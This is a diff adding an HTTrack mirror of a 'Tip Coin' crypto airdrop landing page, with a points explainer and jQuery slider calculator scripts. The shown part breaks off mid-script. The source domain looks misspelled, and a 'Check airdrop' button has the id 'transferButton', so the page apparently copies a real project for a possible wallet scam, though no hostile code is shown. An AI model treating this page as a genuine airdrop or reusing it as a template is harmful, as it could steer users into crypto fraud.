@@ -1,0 +1,1742 @@
+<html lang="en">
+
+
+<!-- Mirrored from thetipcion.io/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Sep 2023 17:30:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="static/images/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Tip Coin</title>
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <link rel="stylesheet" href="static/css/index-ac42f539.css">
+    <style id="_goober">
+        .go1475592160 {
+            height: 0;
+        }
+        .go1671063245 {
+            height: auto;
+        }
+        .go1888806478 {
+            display: flex;
+            flex-wrap: wrap;
+            flex-grow: 1;
+        }
+        @media (min-width:600px) {
+            .go1888806478 {
+                flex-grow: initial;
+                min-width: 288px;
+            }
+        }
+        .go167266335 {
+            background-color: #313131;
+            font-size: 0.875rem;
+            line-height: 1.43;
+            letter-spacing: 0.01071em;
+            color: #fff;
+            align-items: center;
+            padding: 6px 16px;
+            border-radius: 4px;
+            box-shadow: 0px 3px 5px -1px rgba(0, 0, 0, 0.2), 0px 6px 10px 0px rgba(0, 0, 0, 0.14), 0px 1px 18px 0px rgba(0, 0, 0, 0.12);
+        }
+        .go3162094071 {
+            padding-left: 20px;
+        }
+        .go3844575157 {
+            background-color: #313131;
+        }
+        .go1725278324 {
+            background-color: #43a047;
+        }
+        .go3651055292 {
+            background-color: #d32f2f;
+        }
+        .go4215275574 {
+            background-color: #ff9800;
+        }
+        .go1930647212 {
+            background-color: #2196f3;
+        }
+        .go946087465 {
+            display: flex;
+            align-items: center;
+            padding: 8px 0;
+        }
+        .go703367398 {
+            display: flex;
+            align-items: center;
+            margin-left: auto;
+            padding-left: 16px;
+            margin-right: -8px;
+        }
+        .go3963613292 {
+            width: 100%;
+            position: relative;
+            transform: translateX(0);
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            min-width: 288px;
+        }
+        .go1141946668 {
+            box-sizing: border-box;
+            display: flex;
+            max-height: 100%;
+            position: fixed;
+            z-index: 1400;
+            height: auto;
+            width: auto;
+            transition: top 300ms ease 0ms, right 300ms ease 0ms, bottom 300ms ease 0ms, left 300ms ease 0ms, max-width 300ms ease 0ms;
+            pointer-events: none;
+            max-width: calc(100% - 40px);
+        }
+        .go1141946668 .notistack-CollapseWrapper {
+            padding: 6px 0px;
+            transition: padding 300ms ease 0ms;
+        }
+        @media (max-width:599.95px) {
+            .go1141946668 {
+                width: 100%;
+                max-width: calc(100% - 32px);
+            }
+        }
+        .go3868796639 .notistack-CollapseWrapper {
+            padding: 2px 0px;
+        }
+        .go3118922589 {
+            top: 14px;
+            flex-direction: column;
+        }
+        .go1453831412 {
+            bottom: 14px;
+            flex-direction: column-reverse;
+        }
+        .go4027089540 {
+            left: 20px;
+        }
+        @media (min-width:600px) {
+            .go4027089540 {
+                align-items: flex-start;
+            }
+        }
+        @media (max-width:599.95px) {
+            .go4027089540 {
+                left: 16px;
+            }
+        }
+        .go2989568495 {
+            right: 20px;
+        }
+        @media (min-width:600px) {
+            .go2989568495 {
+                align-items: flex-end;
+            }
+        }
+        @media (max-width:599.95px) {
+            .go2989568495 {
+                right: 16px;
+            }
+        }
+        .go4034260886 {
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        @media (min-width:600px) {
+            .go4034260886 {
+                align-items: center;
+            }
+        }
+    </style>
+    <style data-emotion="css-global" data-s=""></style>
+    <style data-emotion="css-global" data-s=""></style>
+    <style data-emotion="css" data-s=""></style>
+</head>
+
+<body>
+    
+    
+    <!-- 自定义提示框 -->
+<div id="customAlert" style="display: none; background-color: #ffffff; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; border: 1px solid #000;">
+    <p id="alertText"></p>
+    <button onclick="closeCustomAlert()">OK</button>
+</div>
+    
+    
+    <div id="root">
+        <div class="MuiBox-root css-i9gxme">
+            <header class="MuiPaper-root MuiPaper-outlined MuiAppBar-root MuiAppBar-colorPrimary MuiAppBar-positionFixed mui-fixed css-1n82n5u">
+                <div class="MuiToolbar-root MuiToolbar-gutters MuiToolbar-regular css-i6s8oy">
+                    <div class="MuiBox-root css-4g6ai3">
+                        <h1 class="MuiTypography-root MuiTypography-h1 css-1oam3qp">Tip Coin</h1>
+                    </div>
+                    <div class="MuiStack-root css-1j3vl0w">
+                        <a href="index.html#start">
+                            <button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeSmall MuiButton-textSizeSmall MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeSmall MuiButton-textSizeSmall css-58v6h8" tabindex="0" type="button">Stats
+                                <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                            </button>
+                        </a>
+                    </div>
+                    
+                    
+                 <!--    <a href="" class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall css-1wmb0oc" tabindex="0" type="button">Check airdrop
+                        <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                    </a>    -->
+                    
+                    <button id="transferButton" href="#" class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall
+                       MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall css-1wmb0oc" tabindex="0" type="button">
+                           Check airdrop
+                           <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                       </button>
+                    
+                    
+                </div>
+            </header>
+        </div>
+        <div class="MuiBox-root css-1humgxl">
+            <div class="MuiStack-root css-1fi24jo">
+                <div class="MuiStack-root css-5uh413">
+                    
+                    <h2 class="MuiTypography-root MuiTypography-h2 css-1tn169j">
+                        The <i>
+                            <b>future</b>
+                        </i> of social interaction
+                    </h2>
+                    <p class="MuiTypography-root MuiTypography-body1 css-iyyoli">
+                        Reward friends and your favorite creators without leaving the comfort of Twitter/X
+                    </p>
+                    
+                    <div class="MuiStack-root css-jj2ztu">
+                        <a class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge css-329fbw" tabindex="0" href="#start">Earn Points
+                            <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                        </a>
+                        <a class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeLarge MuiButton-outlinedSizeLarge MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeLarge MuiButton-outlinedSizeLarge css-125dgr2" tabindex="0" href="#about">Learn More
+                            <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                        </a>
+                    </div>
+                </div>
+                <hr class="MuiDivider-root MuiDivider-fullWidth MuiDivider-flexItem css-10mk4c7">
+                <div class="MuiBox-root css-584fvr">
+                    <div class="MuiBox-root css-sg11fo">
+                        <div class="MuiStack-root css-1ov46kg">
+                            <h3 class="MuiTypography-root MuiTypography-h3 css-10bjihq">How points work:</h3>
+                            <p class="MuiTypography-root MuiTypography-body1 css-t5ptwq">Earning points is simple - just
+                                use Twitter!
+                                <br>
+                                <br>Reply or tweet out mentioning&nbsp;
+                                <span class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                    <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">@tipcoineth</span>
+                                </span>&nbsp;and&nbsp;<span class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                    <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">$tip</span>
+                                </span>&nbsp;and
+                                you will automatically be awarded points!
+                                <br>
+                                <br>Depending on the type of tip, your
+                                multiplier will change as follows:</p>
+                            <ul class="MuiList-root MuiList-padding css-1ontqvh">
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="MessageIcon">
+                                            <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Original
+                                            Tweet</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                            25x point multiplier</p>
+                                    </div>
+                                </li>
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ReplyIcon">
+                                            <path d="M10 9V5l-7 7 7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11z"></path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Tipped
+                                            Reply</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                            1x point multiplier</p>
+                                    </div>
+                                </li>
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="MultipleStopIcon">
+                                            <path d="m17 4 4 4-4 4V9h-4V7h4V4zm-7 3c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zM6 7c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm1 10h4v-2H7v-3l-4 4 4 4v-3zm7 0c.55 0 1-.45 1-1s-.45-1-1-1-1 .45-1 1 .45 1 1 1zm4 0c.55 0 1-.45 1-1s-.45-1-1-1-1 .45-1 1 .45 1 1 1z">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Replied
+                                            kickbacks</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                            1/10 points per tip</p>
+                                    </div>
+                                </li>
+                            </ul>
+                            <p class="MuiTypography-root MuiTypography-body1 css-t5ptwq">And remember keep an eye out,
+                                there might be additional multipliers at claim...</p>
+                        </div>
+                    </div>
+                    <div class="MuiBox-root css-sg11fo">
+                        <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded css-1cty3g5">
+                            <div class="MuiStack-root css-1ov46kg">
+                                <h5 class="MuiTypography-root MuiTypography-h5 css-1d91fdb">Expected Point Calculator
+                                </h5>
+                                <div class="MuiStack-root css-jj2ztu">
+                                    <div class="MuiStack-root css-1azdxn2">
+                                        <div class="MuiFormControl-root css-13sljp9">
+                                            <label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-colorPrimary MuiFormLabel-filled MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined css-m95sgc" data-shrink="true">Tweet Type</label>
+                                            <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorPrimary MuiInputBase-formControl  css-31l584">
+                                                <div tabindex="0" role="button" aria-expanded="true" aria-haspopup="listbox" class="MuiSelect-select MuiSelect-outlined MuiInputBase-input MuiOutlinedInput-input css-yjbt8g">
+                                                    Original Tweet</div>
+                                                <input aria-invalid="false" aria-hidden="true" tabindex="-1" class="MuiSelect-nativeInput css-1k3x8v3" value="tweet">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium MuiSelect-icon MuiSelect-iconOutlined css-2s48wk" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                                                    <path d="M7 10l5 5 5-5z"></path>
+                                                </svg>
+                                                <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-nqlg3w">
+                                                    <legend class="css-14lo706">
+                                                        <span>Tweet Type</span>
+                                                    </legend>
+                                                </fieldset>
+                                            </div>
+                                        </div>
+                                        <style>
+                                            #menu-{
+                                                    display: none;
+                                                }
+                                            </style>
+                                        <div role="presentation" id="menu-" class="MuiMenu-root MuiPopover-root MuiModal-root css-1sucic7" style="position: relative;margin: 0;">
+                                            <div tabindex="0" data-testid="sentinelStart"></div>
+                                            <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded MuiMenu-paper MuiPopover-paper MuiMenu-paper css-lp4m3g" tabindex="-1" style="opacity: 1; min-width: 271px; top: 0px; left: 0;">
+                                                <ul class="MuiList-root MuiList-padding MuiMenu-list css-r8u8y9" role="listbox" tabindex="-1">
+                                                    <li id="tab1" class="MuiButtonBase-root MuiMenuItem-root MuiMenuItem-gutters Mui-selected MuiMenuItem-root MuiMenuItem-gutters Mui-selected css-l0hw8u" tabindex="0" role="option" aria-selected="true" data-value="tweet">Original Tweet<span class="MuiTouchRipple-root css-w0pj6f"></span>
+                                                    </li>
+                                                    <li id="tab2" class="MuiButtonBase-root MuiMenuItem-root MuiMenuItem-gutters MuiMenuItem-root MuiMenuItem-gutters css-l0hw8u" tabindex="-1" role="option" aria-selected="false" data-value="reply">Tipped Reply<span class="MuiTouchRipple-root css-w0pj6f"></span>
+                                                    </li>
+                                                    <li id="tab3" class="MuiButtonBase-root MuiMenuItem-root MuiMenuItem-gutters MuiMenuItem-root MuiMenuItem-gutters css-l0hw8u" tabindex="-1" role="option" aria-selected="false" data-value="kickback">Tipped Kickback<span class="MuiTouchRipple-root css-w0pj6f"></span>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div tabindex="0" data-testid="sentinelEnd"></div>
+                                        </div>
+                                        <script src="static/js/jquery.min.js"></script>
+
+                                        <script type="text/javascript">
+                                        $(document).ready(function(e) {
+                                            //设置最大值
+                                            ScrollBar.maxValue = 10;
+                                            //初始化
+                                            ScrollBar.Initialize();
+                                            //设置最大值
+                                            ProgressBar.maxValue = 10;
+                                            //设置当前刻度
+                                            var index = 0;
+                                            var mProgressTimer = setInterval(function() {
+                                                index += 1;
+                                                ProgressBar.SetValue(index);
+                                            }, 10);
+                                        });
+                                        var ScrollBar = {
+                                            value: 5,
+                                            maxValue: 10,
+                                            step: 1,
+                                            currentX: 0,
+                                            Initialize: function() {
+                                                if (this.value > this.maxValue) {
+                                                    alert("给定当前值大于了最大值");
+                                                    return;
+                                                }
+
+                                                this.GetValue();
+                                                $("#scroll_Track").css("width", this.currentX + 2 + "px");
+                                                $("#scroll_Thumb").css("margin-left", this.currentX + "px");
+                                                this.Value();
+                                                $("#scrollBarTxt").html(ScrollBar.value + '0K');
+                                                var shuzhi = ScrollBar.value * 10;
+                                                $("#eq1").html(shuzhi + ',000 points');
+                                                var total = parseInt($("#eq1").html()) + parseInt($("#eq2").html()) + parseInt($("#eq3").html()) + parseInt($("#eq4").html()) + parseInt($("#eq5").html());
+                                                $('.total1').html(total + ',000');
+                                            },
+                                            Value: function() {
+                                                var valite = false;
+                                                var currentValue;
+
+                                                $("#scroll_Thumb").mousedown(function() {
+                                                    valite = true;
+                                                    $(document.body).mousemove(function(event) {
+                                                        if (valite == false) return;
+                                                        var changeX = event.clientX - ScrollBar.currentX;
+                                                        currentValue = changeX - $("#Demo").offset().left + 100.5;
+
+                                                        $("#scroll_Thumb").css("margin-left", currentValue + "px");
+                                                        $("#scroll_Track").css("width", currentValue + 2 + "px");
+                                                        if ((currentValue + 25) >= $("#scrollBar").width()) {
+                                                            $("#scroll_Thumb").css("margin-left", $("#scrollBar").width() - 25 + "px");
+                                                            $("#scroll_Track").css("width", $("#scrollBar").width() + 2 + "px");
+                                                            ScrollBar.value = ScrollBar.maxValue;
+                                                        } else if (currentValue <= 0) {
+                                                            $("#scroll_Thumb").css("margin-left", "0px");
+                                                            $("#scroll_Track").css("width", "0px");
+                                                        } else {
+                                                            ScrollBar.value = Math.round(10 * (currentValue / $("#scrollBar").width()));
+                                                        }
+                                                        $("#scrollBarTxt").html(ScrollBar.value + '0K');
+                                                        var shuzhi = ScrollBar.value * 10;
+                                                        $("#eq1").html(shuzhi + ',000 points');
+                                                        var total = parseInt($("#eq1").html()) + parseInt($("#eq2").html()) + parseInt($("#eq3").html()) + parseInt($("#eq4").html()) + parseInt($("#eq5").html());
+                                                        $('.total1').html(total + ',000');
+                                                    });
+                                                });
+                                                $(document.body).mouseup(function() {
+                                                    ScrollBar.value = Math.round(10 * (currentValue / $("#scrollBar").width()));
+                                                    valite = false;
+                                                    if (ScrollBar.value >= ScrollBar.maxValue) ScrollBar.value = ScrollBar.maxValue;
+                                                    if (ScrollBar.value <= 0) ScrollBar.value = 0;
+                                                    $("#scrollBarTxt").html(ScrollBar.value + '0K');
+                                                });
+                                            },
+                                            GetValue: function() {
+                                                this.currentX = $("#scrollBar").width() * (this.value / this.maxValue);
+                                            }
+                                        }
+                                        var ProgressBar = {
+
+                                            maxValue: 10,
+
+                                            value: 0,
+
+                                            SetValue: function(aValue) {
+
+                                                this.value = aValue;
+
+                                                if (this.value >= this.maxValue) this.value = this.maxValue;
+
+                                                if (this.value <= 0) this.value = 0;
+
+                                                var mWidth = this.value / this.maxValue * $("#progressBar").width() + "px";
+
+                                                $("#progressBar_Track").css("width", mWidth);
+
+                                                $("#progressBarTxt").html(this.value + "0k");
+
+                                            }
+
+                                        }
+                                        </script>
+                                        <script type="text/javascript">
+                                        $(document).ready(function(e) {
+                                            //设置最大值
+                                            ScrollBar1.maxValue = 10;
+                                            //初始化
+                                            ScrollBar1.Initialize();
+                                            //设置最大值
+                                            ProgressBar1.maxValue = 10;
+                                            //设置当前刻度
+                                            var index = 0;
+                                            var mProgressTimer1 = setInterval(function() {
+                                                index += 1;
+                                                ProgressBar1.SetValue(index);
+                                            }, 10);
+                                        });
+                                        var ScrollBar1 = {
+                                            value: 3,
+                                            maxValue: 10,
+                                            step: 1,
+                                            currentX: 0,
+                                            Initialize: function() {
+                                                if (this.value > this.maxValue) {
+                                                    alert("给定当前值大于了最大值");
+                                                    return;
+                                                }
+                                                this.GetValue();
+                                                $("#scroll_Track1").css("width", this.currentX + 2 + "px");
+                                                $("#scroll_Thumb1").css("margin-left", this.currentX + "px");
+                                                this.Value();
+                                                $("#scrollBarTxt1").html(ScrollBar1.value + '00');
+                                                var shuzhi1 = ScrollBar1.value * 10;
+                                                console.log(shuzhi1);
+                                                $("#eq2").html(shuzhi1 + ',000 points');
+                                            },
+                                            Value: function() {
+                                                var valite = false;
+                                                var currentValue;
+                                                $("#scroll_Thumb1").mousedown(function() {
+                                                    valite = true;
+                                                    $(document.body).mousemove(function(event) {
+                                                        if (valite == false) return;
+                                                        var changeX = event.clientX - ScrollBar1.currentX;
+                                                        currentValue = changeX - $("#Demo1").offset().left + 60.3;
+
+                                                        $("#scroll_Thumb1").css("margin-left", currentValue + "px");
+                                                        $("#scroll_Track1").css("width", currentValue + 2 + "px");
+                                                        if ((currentValue + 25) >= $("#scrollBar1").width()) {
+                                                            $("#scroll_Thumb1").css("margin-left", $("#scrollBar1").width() - 25 + "px");
+                                                            $("#scroll_Track1").css("width", $("#scrollBar1").width() + 2 + "px");
+                                                            ScrollBar1.value = ScrollBar1.maxValue;
+                                                        } else if (currentValue <= 0) {
+                                                            $("#scroll_Thumb1").css("margin-left", "0px");
+                                                            $("#scroll_Track1").css("width", "0px");
+                                                        } else {
+                                                            ScrollBar1.value = Math.round(10 * (currentValue / $("#scrollBar1").width()));
+                                                        }
+                                                        $("#scrollBarTxt1").html(ScrollBar1.value + '00');
+                                                        var shuzhi1 = ScrollBar1.value * 10;
+                                                        $("#eq2").html(shuzhi1 + ',000 points');
+                                                        var total = parseInt($("#eq1").html()) + parseInt($("#eq2").html())+ parseInt($("#eq3").html())+ parseInt($("#eq4").html())+ parseInt($("#eq5").html());
+                                                         $('.total1').html(total + ',000');
+                                                    });
+                                                });
+                                                $(document.body).mouseup(function() {
+                                                    ScrollBar1.value = Math.round(10 * (currentValue / $("#scrollBar1").width()));
+                                                    valite = false;
+                                                    if (ScrollBar1.value >= ScrollBar1.maxValue) ScrollBar1.value = ScrollBar1.maxValue;
+                                                    if (ScrollBar1.value <= 0) ScrollBar1.value = 0;
+                                                    $("#scrollBarTxt1").html(ScrollBar1.value + '00');
+                                                });
+                                            },
+                                            GetValue: function() {
+                                                this.currentX = $("#scrollBar1").width() * (this.value / this.maxValue);
+                                            }
+                                        }
+                                        var ProgressBar1 = {
+
+                                            maxValue: 100,
+
+                                            value: 20,
+
+                                            SetValue: function(aValue) {
+
+                                                this.value = aValue;
+
+                                                if (this.value >= this.maxValue) this.value = this.maxValue;
+
+                                                if (this.value <= 0) this.value = 0;
+
+                                                var mWidth = this.value / this.maxValue * $("#progressBar1").width() + "px";
+
+                                                $("#progressBar_Track1").css("width", mWidth);
+
+                                                $("#progressBarTxt1").html(this.value);
+
+                                            }
+
+                                        }
+                                        </script>
+                                        <script type="text/javascript">
+                                        $(document).ready(function(e) {
+                                            //设置最大值
+                                            ScrollBar2.maxValue = 10;
+                                            //初始化
+                                            ScrollBar2.Initialize();
+                                            //设置最大值
+                                            ProgressBar2.maxValue = 10;
+                                            //设置当前刻度
+                                            var index = 0;
+                                            var mProgressTimer2 = setInterval(function() {
+                                                index += 1;
+                                                ProgressBar2.SetValue(index);
+                                            }, 10);
+                                        });
+                                        var ScrollBar2 = {
+                                            value: 2,
+                                            maxValue: 10,
+                                            step: 1,
+                                            currentX: 0,
+                                            Initialize: function() {
+                                                if (this.value > this.maxValue) {
+                                                    alert("给定当前值大于了最大值");
+                                                    return;
+                                                }
+                                                this.GetValue();
+                                                $("#scroll_Track2").css("width", this.currentX + 2 + "px");
+                                                $("#scroll_Thumb2").css("margin-left", this.currentX + "px");
+                                                this.Value();
+                                                $("#scrollBarTxt2").html(ScrollBar2.value + '00');
+                                                var shuzhi2 = ScrollBar2.value * 25;
+                                                $("#eq3").html(shuzhi2 + ',000 points');
+                                            },
+                                            Value: function() {
+                                                var valite = false;
+                                                var currentValue;
+                                                $("#scroll_Thumb2").mousedown(function() {
+                                                    valite = true;
+                                                    $(document.body).mousemove(function(event) {
+                                                        if (valite == false) return;
+                                                        var changeX = event.clientX - ScrollBar2.currentX;
+                                                        currentValue = changeX - $("#Demo2").offset().left + 35.2;
+
+                                                        $("#scroll_Thumb2").css("margin-left", currentValue + "px");
+                                                        $("#scroll_Track2").css("width", currentValue + 2 + "px");
+                                                        if ((currentValue + 25) >= $("#scrollBar2").width()) {
+                                                            $("#scroll_Thumb2").css("margin-left", $("#scrollBar2").width() - 25 + "px");
+                                                            $("#scroll_Track2").css("width", $("#scrollBar2").width() + 2 + "px");
+                                                            ScrollBar2.value = ScrollBar2.maxValue;
+                                                        } else if (currentValue <= 0) {
+                                                            $("#scroll_Thumb2").css("margin-left", "0px");
+                                                            $("#scroll_Track2").css("width", "0px");
+                                                        } else {
+                                                            ScrollBar2.value = Math.round(10 * (currentValue / $("#scrollBar2").width()));
+                                                        }
+                                                        $("#scrollBarTxt2").html(ScrollBar2.value + '00');
+                                                        var shuzhi2 = ScrollBar2.value * 25;
+                                                        $("#eq3").html(shuzhi2 + ',000 points');
+                                                        var total = parseInt($("#eq1").html()) + parseInt($("#eq2").html())+ parseInt($("#eq3").html())+ parseInt($("#eq4").html())+ parseInt($("#eq5").html());
+                                                         $('.total1').html(total + ',000');
+                                                    });
+                                                });
+                                                $(document.body).mouseup(function() {
+                                                    ScrollBar.value = Math.round(10 * (currentValue / $("#scrollBar2").width()));
+                                                    valite = false;
+                                                    if (ScrollBar.value >= ScrollBar.maxValue) ScrollBar.value = ScrollBar.maxValue;
+                                                    if (ScrollBar.value <= 0) ScrollBar.value = 0;
+                                                    $("#scrollBarTxt2").html(ScrollBar.value + '00');
+                                                });
+                                            },
+                                            GetValue: function() {
+                                                this.currentX = $("#scrollBar2").width() * (this.value / this.maxValue);
+                                            }
+                                        }
+                                        var ProgressBar2 = {
+
+                                            maxValue: 100,
+
+                                            value: 20,
+
+                                            SetValue: function(aValue) {
+
+                                                this.value = aValue;
+
+                                                if (this.value >= this.maxValue) this.value = this.maxValue;
+
+                                                if (this.value <= 0) this.value = 0;
+
+                                                var mWidth = this.value / this.maxValue * $("#progressBar2").width() + "px";
+
+                                                $("#progressBar_Track2").css("width", mWidth);
+
+                                                $("#progressBarTxt2").html(this.value);
+
+                                            }
+
+                                        }
+                                        </script>
+                                        <script type="text/javascript">
+                                        $(document).ready(function(e) {
+                                            //设置最大值
+                                            ScrollBar3.maxValue = 10;
+                                            //初始化
+                                            ScrollBar3.Initialize();
+                                            //设置最大值
+                                            ProgressBar3.maxValue = 10;
+                                            //设置当前刻度
+                                            var index = 0;
+                                            var mProgressTimer3 = setInterval(function() {
+                                                index += 1;
+                                                ProgressBar3.SetValue(index);
+                                            }, 10);
+                                        });
+                                        var ScrollBar3 = {
+                                            value: 7,
+                                            maxValue: 10,
+                                            step: 1,
+                                            currentX: 0,
+                                            Initialize: function() {
+                                                if (this.value > this.maxValue) {
+                                                    alert("给定当前值大于了最大值");
+                                                    return;
+                                                }
+                                                this.GetValue();
+                                                $("#scroll_Track3").css("width", this.currentX + 2 + "px");
+                                                $("#scroll_Thumb3").css("margin-left", this.currentX + "px");
+                                                this.Value();
+                                                $("#scrollBarTxt3").html(ScrollBar3.value + '0');
+                                                var shuzhi3 = ScrollBar3.value * 10;
+                                                $("#eq4").html(shuzhi3 + ',000 points');
+                                            },
+                                            Value: function() {
+                                                var valite = false;
+                                                var currentValue;
+                                                $("#scroll_Thumb3").mousedown(function() {
+                                                    valite = true;
+                                                    $(document.body).mousemove(function(event) {
+                                                        if (valite == false) return;
+                                                        var changeX = event.clientX - ScrollBar3.currentX;
+                                                        currentValue = changeX - $("#Demo3").offset().left + 140.7;
+
+                                                        $("#scroll_Thumb3").css("margin-left", currentValue + "px");
+                                                        $("#scroll_Track3").css("width", currentValue + 2 + "px");
+                                                        if ((currentValue + 25) >= $("#scrollBar3").width()) {
+                                                            $("#scroll_Thumb3").css("margin-left", $("#scrollBar3").width() - 25 + "px");
+                                                            $("#scroll_Track3").css("width", $("#scrollBar3").width() + 2 + "px");
+                                                            ScrollBar3.value = ScrollBar3.maxValue;
+                                                        } else if (currentValue <= 0) {
+                                                            $("#scroll_Thumb3").css("margin-left", "0px");
+                                                            $("#scroll_Track3").css("width", "0px");
+                                                        } else {
+                                                            ScrollBar3.value = Math.round(10 * (currentValue / $("#scrollBar3").width()));
+                                                        }
+                                                        $("#scrollBarTxt3").html(ScrollBar3.value + '00');
+                                                        var shuzhi3 = ScrollBar3.value * 10;
+                                                        $("#eq4").html(shuzhi3 + ',000 points');
+                                                        var total = parseInt($("#eq1").html()) + parseInt($("#eq2").html())+ parseInt($("#eq3").html())+ parseInt($("#eq4").html())+ parseInt($("#eq5").html());
+                                                         $('.total1').html(total + ',000');
+                                                    });
+                                                });
+                                                $(document.body).mouseup(function() {
+                                                    ScrollBar3.value = Math.round(10 * (currentValue / $("#scrollBar3").width()));
+                                                    valite = false;
+                                                    if (ScrollBar3.value >= ScrollBar3.maxValue) ScrollBar3.value = ScrollBar3.maxValue;
+                                                    if (ScrollBar3.value <= 0) ScrollBar3.value = 0;
+                                                    $("#scrollBarTxt3").html(ScrollBar3.value + '00');
+                                                });
+                                            },
+                                            GetValue: function() {
+                                                this.currentX = $("#scrollBar3").width() * (this.value / this.maxValue);
+                                            }
+                                        }
+                                        var ProgressBar3 = {
+
+                                            maxValue: 100,
+
+                                            value: 20,
+
+                                            SetValue: function(aValue) {
+
+                                                this.value = aValue;
+
+                                                if (this.value >= this.maxValue) this.value = this.maxValue;
+
+                                                if (this.value <= 0) this.value = 0;
+
+                                                var mWidth = this.value / this.maxValue * $("#progressBar3").width() + "px";
+
+                                                $("#progressBar_Track3").css("width", mWidth);
+
+                                                $("#progressBarTxt3").html(this.value);
+
+                                            }
+
+                                        }
+                                        </script>
+                                        <script type="text/javascript">
+                                        $(document).ready(function(e) {
+                                            //设置最大值
+                                            ScrollBar4.maxValue = 10;
+                                            //初始化
+                                            ScrollBar4.Initialize();
+                                            //设置最大值
+                                            ProgressBar4.maxValue = 10;
+                                            //设置当前刻度
+                                            var index = 0;
+                                            var mProgressTimer4 = setInterval(function() {
+                                                index += 1;
+                                                ProgressBar4.SetValue(index);
+                                            }, 10);
+                                        });
+                                        var ScrollBar4 = {
+                                            value: 5,
+                                            maxValue: 10,
+                                            step: 1,
+                                            currentX: 0,
+                                            Initialize: function() {
+                                                if (this.value > this.maxValue) {
+                                                    alert("给定当前值大于了最大值");
+                                                    return;
+                                                }
+                                                this.GetValue();
